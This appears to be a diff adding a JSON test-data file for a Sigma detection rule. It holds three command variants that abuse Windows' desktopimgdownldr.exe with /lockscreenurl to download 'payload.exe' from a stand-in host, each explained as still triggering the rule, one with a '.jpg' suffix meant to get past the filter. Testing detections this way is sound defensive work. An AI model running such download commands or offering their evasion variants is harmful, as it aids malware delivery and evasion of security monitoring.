@@ -1,0 +1,14 @@
+[
+  {
+    "output": "desktopimgdownldr.exe /lockscreenurl:http://example.com/payload.exe /eventName:desktopimgdownldr",
+    "explanation": "This command uses the original structure but omits unnecessary elements while preserving the suspicious behavior. It retains the key parameter '/lockscreenurl' which is flagged by the Sigma rule."
+  },
+  {
+    "output": "desktopimgdownldr.exe -lockscreenurl:http://example.com/payload.exe /eventName:desktopimgdownldr",
+    "explanation": "Substitutes the '/' with '-' for the '/lockscreenurl' parameter, which is a valid syntax substitution and still triggers the Sigma rule."
+  },
+  {
+    "output": "desktopimgdownldr.exe /lockscreenurl:http://example.com/payload.exe?bypass=.jpg /eventName:desktopimgdownldr",
+    "explanation": "Appends a '.jpg' extension to the URL to attempt to bypass the filter, but the Sigma rule still detects the '/lockscreenurl' parameter."
+  }
+]
